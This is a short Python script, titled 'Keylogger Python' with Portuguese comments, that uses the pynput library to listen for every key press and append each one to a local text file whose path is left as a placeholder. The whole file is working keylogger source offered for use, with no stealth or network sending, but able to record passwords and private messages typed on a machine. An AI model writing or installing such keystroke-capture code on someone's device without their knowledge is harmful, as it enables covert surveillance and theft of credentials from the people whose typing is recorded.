####################################################################
#                      Keylogger Python                            #
####################################################################

#Importando a biblioteca pynput, e o método Listener.
from pynput.keyboard import Listener

logFile = "Caminho do txt"

def writeLog(key):
    keydata = str(key)
    with open(logFile, "a") as f:
        f.write(keydata)
        
with Listener(on_press=writeLog) as l:
    l.join()
